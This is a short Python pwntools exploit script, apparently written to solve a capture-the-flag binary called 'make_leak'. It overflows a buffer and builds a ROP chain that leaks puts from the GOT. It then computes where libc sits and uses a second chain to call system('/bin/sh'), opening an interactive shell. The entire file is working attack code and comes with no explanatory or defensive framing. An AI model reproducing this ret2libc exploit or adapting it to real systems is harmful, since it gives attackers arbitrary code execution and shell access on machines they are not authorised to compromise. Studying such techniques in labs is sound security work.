#!/usr/bin/python
from pwn import *

PUTS_PLT_ADDRESS = 0x400430
PUTS_GOT_ADDRESS = 0x601018
MAIN_ADDRESS     = 0x400566
PUTS_OFFSET      = 0x06f690
SYSTEM_OFFSET    = 0x045390
BIN_SH_OFFSET    = 0x18cd17

rop = "A" * 40
# 0x0000000000400613 : pop rdi ; ret
rop += p64(0x400613) + p64(PUTS_GOT_ADDRESS)
rop += p64(PUTS_PLT_ADDRESS)
rop += p64(MAIN_ADDRESS)

p = process("./make_leak")
p.sendline(rop)
p.readuntil("week.\n")

puts_leak = u64(p.read(6) + "\x00\x00")
log.info("leaked puts address: 0x{:>8x}".format(puts_leak))
libc_base_address = puts_leak - PUTS_OFFSET
system_address    = libc_base_address + SYSTEM_OFFSET
bin_sh_address    = libc_base_address + BIN_SH_OFFSET
log.info("found libc base address: 0x{:>8x}".format(libc_base_address))
log.info("found system address: 0x{:>8x}".format(system_address))
log.info("found \"/bin/sh\" address: 0x{:>8x}".format(bin_sh_address))

rop = "A" * 40
# 0x0000000000400613 : pop rdi ; ret
rop += p64(0x400613) + p64(bin_sh_address)
rop += p64(system_address)

p.sendline(rop) 
p.interactive()
